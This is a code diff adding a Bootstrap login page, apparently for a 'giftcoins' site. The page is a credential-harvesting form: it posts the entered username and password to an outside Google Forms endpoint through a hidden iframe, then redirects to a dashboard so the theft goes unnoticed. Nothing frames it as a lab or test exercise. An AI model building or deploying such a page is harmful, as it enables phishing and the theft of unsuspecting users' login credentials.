@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <link href="favicon_io/favicon-16x16.png" rel="shortcut icon"/>
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+  <!-- Font Awesome -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"rel="stylesheet"/>
+  <style>
+    body {
+      background-color: #f8f9fa;
+    }
+
+    .login-container {
+      margin-top: 5%;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container login-container">
+    <div class="row justify-content-center">
+      <div class="col-md-6 col-sm-8 col-lg-4">
+        <div class="card">
+          <div class="card-header bg-dark text-white text-center">
+            <h3>Login</h3>
+          </div>
+
+          <div class="card-body">
+            <script type="text/javascript">var submitted=false;</script>
+            <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted) 
+             {window.location='./dashboard.html';}"></iframe>
+            <form method="POST" action="https://docs.google.com/forms/d/e/1FAIpQLSdrk32XySWwHY-mMUiQj_YUxOdW_Hp5vnGrqHEmZq8ypLHqaQ/formResponse"
+             target="hidden_iframe" onsubmit="submitted=true;">
+            <!--<form action="/giftcoins/dashboard.html">-->
+              <div class="form-group">
+                <label for="username">Username:</label>
+                <input type="text" name="entry.2005620554" class="form-control" id="username"  placeholder="Enter your username" required>
+        
+              <br>
+              <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="text" name="entry.1065046570" class="form-control" id="password" placeholder="Enter your password" required>
+                
+              </div>
+              <button type="submit" class="btn btn-dark btn-block">Login</button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer class="bg-light text-light">
+    <div class="container">
+      <!-- Logo -->
+      <i class="fa fa-long-arrow-left" style="color: #000000;"></i><a href="index.html">
+        <img src="img/loggo.png" alt="Company Logo" width="200px"
+      class="img-fluid mb-3" style="max-width: 100px;"></a>
+    </div>
+  </footer>
+
+  <!-- Bootstrap JS and dependencies -->
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+
+</body>
+
+</html>
